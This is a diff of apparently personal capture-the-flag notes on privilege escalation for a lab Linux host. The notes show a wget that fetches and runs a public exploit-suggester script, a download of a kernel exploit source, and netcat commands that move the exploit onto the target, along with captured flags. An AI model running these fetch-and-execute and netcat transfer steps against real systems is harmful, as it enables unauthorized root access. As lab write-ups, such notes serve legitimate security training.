@@ -172,7 +172,8 @@ the right user was joey
 flag{f9038fd090b8490c7d8b613f0df054ba0e6ff63a82e19b}.jpg
 -------------------------------------------------------------------------
 used linux exploit suggester
-find 
+find uname -a
+Linux matrix3-sea-turtle 4.13.0-21-generic #24-Ubuntu SMP Mon Dec 18 17:29:16 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 
 wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
 chmod +x les.sh 
@@ -189,6 +190,7 @@ chmod +x les.sh
 
 wget https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c
 nc -lvnp 2424
+
  nc -w 5 192.168.0.2 2424 >eBPF.c
 flag{6be6ef286c041a489b9f681acdd8afebb441a9b22df584}.jpg
 ----------------------------------------------------------------------
